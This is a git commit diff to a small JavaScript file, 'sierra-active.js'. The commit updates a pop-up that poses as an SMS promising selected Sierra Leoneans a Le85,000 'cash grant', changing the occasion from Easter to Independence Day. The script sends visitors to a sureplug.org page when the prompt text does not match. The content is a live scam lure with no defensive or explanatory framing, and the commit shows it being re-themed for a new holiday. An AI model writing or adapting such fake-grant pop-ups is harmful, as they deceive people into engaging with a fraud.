9efae9444e470e60c48b66090fbacb587dd0ad40
surepluger <adigunkola666@gmail.com>
2025-04-25 07:43:12 +0100

    Update sierra-active.js

--- sierra-active.js
+++ sierra-active.js
@@ -1,5 +1,5 @@
 var password = 'WITHDRAW Le85,000'
-password=prompt('SMS: Congratulations, you are among the selected Sierra Leonean to receive Le85,000 as Easter Celebration cash grant, Press Ok to withdraw cash Now ','WITHDRAW Le85,000');
+password=prompt('SMS: Congratulations, you are among the selected Sierra Leonean to receive Le85,000 as Independence Day Celebration cash grant, Press Ok to withdraw cash Now ','WITHDRAW Le85,000');
 if (password != 'WITHDRAW Le85,000') {
 location.href='https://sureplug.org/sierra-easter.html';
 }
